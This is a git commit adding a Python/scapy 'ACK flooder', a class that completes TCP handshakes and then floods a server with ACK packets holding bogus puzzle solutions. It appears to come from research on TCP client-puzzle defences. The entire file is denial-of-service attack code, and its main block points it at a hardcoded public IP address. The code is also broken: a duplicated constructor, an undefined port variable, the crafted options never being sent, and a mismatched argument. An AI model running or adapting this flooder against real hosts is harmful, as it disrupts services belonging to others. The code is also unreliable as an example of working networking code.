3111c3403542f1c1c86866a0a7d7bbf916eccfb7
Mohammad <nouredd2@illinois.edu>
2017-11-21 17:38:10 -0600

    added ack flooder

---
+++ AckFlooder.py
@@ -0,0 +1,98 @@
+from scapy.all import *
+import time
+import numpy as np
+import socket
+
+
+class ACKFlooder:
+    """
+
+    This flooder agent construct ACK packets with bogus solutions
+    in order to overwhelm the server with the burden of verifying
+    its bad solutions.
+
+    """
+
+    def __init__(self):
+        self.k = 0
+        self.m = 0
+        self.num_sent_packets = 0
+        self.sending_rate = 0
+        self.destination = None
+        self.dport = 80
+        self.interval = 10
+        self.mss = 1000
+        self.w_scale = 7
+        self.tsecr = 0
+        self.curr_time = 0
+
+    def __init__(self, k, m, rate, dst):
+        self.k = k
+        self.m = m
+        self.num_sent_packets = 0
+        self.sending_rate = rate
+        self.destination = dst
+        self.dport = 80
+        self.interval = 10
+        self.mss = 1000
+        self.w_scale = 7
+        self.tsecr = 0
+        self.curr_time = 0
+
+    def sendPacket(self, ip, sequence_number, ack_number):
+        # build up the packet's options
+        tsval = time.time()
+        options = ['Timestamp', (self.tsecr, tsval)]
+
+        # build the solution
+        mss_flipped = socket.htons(self.mss)
+        opt_str = hex(mss_flipped)[2:].decode('hex')
+        opt_str += hex(self.w_scale)[2:].decode('hex')
+
+        for i in np.arange(0, self.k):
+            # get four random bytes
+            rbyte = np.random.randint(low=0, high=np.iinfo(np.int32).max)
+            opt_str += hex(rbyte)[2:].decode('hex')
+
+        ack = TCP(sport=sport, dport=self.dport, flags="A",
+                  seq=sequence_number + 1, ack=ack_number)
+        send(ip/ack)
+
+    def startSending(self, maxPackets):
+        """
+        Send a number of ACKS up to maxPackets
+
+        @maxPackets: the maximum number of packets to send
+        """
+
+        start_time = 0
+        sport = 0
+        seq = np.random.randint(low=0, high=np.iinfo(np.int32).max)
+        while self.num_sent_packets <= maxPackets:
+            ip = IP(dst=self.destination)
+
+            # refresh the sequence number and the timestamps every interval
+            # seconds, this is to avoid any timeouts
+            if start_time == 0 or (self.curr_time - start_time >= self.interval):
+                sport = np.random.randint(low=0, high=65536)
+                ts = time.time()
+                syn = TCP(sport=sport, dport=self.dport, flags="S", seq=seq,
+                          options=['Timestamp', (ts, 0)])
+                synack = sr1(ip/syn)
+                ack_num = synack.seq + 1
+
+                opts = synack[IP][TCP].options
+                for opcode, val in opts:
+                    if opcode == 'Timestamp':
+                        self.tsecr = val[0]
+
+                start_time = self.curr_time
+
+            self.sendPacket(sport, seq, ack_num)
+            self.num_sent_packets += 1
+            self.curr_time = time.time()
+
+
+if __name__ == '__main__':
+    flooder = ACKFlooder(k=1, m=17, rate=0, dst='172.217.4.228')
+    flooder.startSending(2)
